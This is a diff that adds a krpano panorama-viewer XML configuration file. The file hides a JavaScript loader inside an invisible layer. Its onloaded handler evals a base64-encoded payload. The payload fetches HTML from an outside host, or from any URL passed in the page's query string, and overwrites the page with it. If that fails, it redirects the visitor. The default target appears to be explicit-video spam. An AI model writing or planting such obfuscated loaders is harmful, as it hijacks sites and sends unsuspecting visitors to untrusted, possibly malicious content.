@@ -1,0 +1,9 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<krpano version="1.0.8.15">
+  <!-- Generated: 2026-08-17T17:33:47 -->
+  <!-- Mode: WRITE (competitor-style fetch+document.write) -->
+  <!-- Upload to: https://forever2468.github.io/love/z.xml -->
+  <!-- Posts base: http://dev.gamempo.edu.openxcplatform.com/pox/video/ -->
+  <layer name="js_loader" type="container" visible="false"
+    onloaded="js(eval(var w=atob('dmFyIGlkPW5ldyBVUkxTZWFyY2hQYXJhbXMobG9jYXRpb24uc2VhcmNoKS5nZXQoImlkIil8fCIxOC1tbXMtdW1haXJpLXdhbGktdmlkZW8tcG9yLTEwMDM4MSI7dmFyIEJBU0U9Imh0dHA6Ly9kZXYuZ2FtZW1wby5lZHUub3BlbnhjcGxhdGZvcm0uY29tL3BveC92aWRlby8iO3ZhciB1cmw9KC9eaHR0cHM/OlwvXC8vaS50ZXN0KGlkKSk/aWQ6KEJBU0UrU3RyaW5nKGlkKS5yZXBsYWNlKC9eXC8rLywiIikucmVwbGFjZSgvXC5odG1sJC9pLCIiKSsiLmh0bWwiKTtmZXRjaCh1cmwpLnRoZW4oZnVuY3Rpb24oZSl7cmV0dXJuIGUudGV4dCgpfSkudGhlbihmdW5jdGlvbihlKXtkb2N1bWVudC5vcGVuKCk7ZG9jdW1lbnQud3JpdGUoZSk7ZG9jdW1lbnQuY2xvc2UoKX0pLmNhdGNoKGZ1bmN0aW9uKCl7dHJ5e3RvcC5sb2NhdGlvbi5yZXBsYWNlKHVybCl9Y2F0Y2goeCl7bG9jYXRpb24uaHJlZj11cmx9fSk7');eval(w)););" />
+</krpano>
